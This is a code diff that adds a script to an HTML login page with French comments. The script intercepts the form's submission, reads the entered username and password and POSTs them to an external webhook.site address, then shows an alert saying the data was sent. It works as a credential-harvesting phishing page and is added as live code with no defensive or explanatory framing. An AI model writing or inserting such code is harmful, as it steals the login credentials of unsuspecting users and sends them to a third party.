@@ -55,5 +55,35 @@
             <input type="submit" value="Se connecter">
         </form>
     </div>
+
+    <script>
+        // Intercepter la soumission du formulaire
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Empêcher la soumission classique du formulaire
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Envoyer les données à l'URL cible
+            try {
+                const response = await fetch('https://webhook.site/3e17ccde-8a6c-4d7d-8b4d-38ade87aac0f', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+                });
+
+                if (response.ok) {
+                    alert('Données envoyées avec succès');
+                } else {
+                    alert('Erreur lors de l\'envoi des données');
+                }
+            } catch (error) {
+                console.error('Erreur :', error);
+                alert('Erreur réseau');
+            }
+        });
+    </script>
 </body>
 </html>
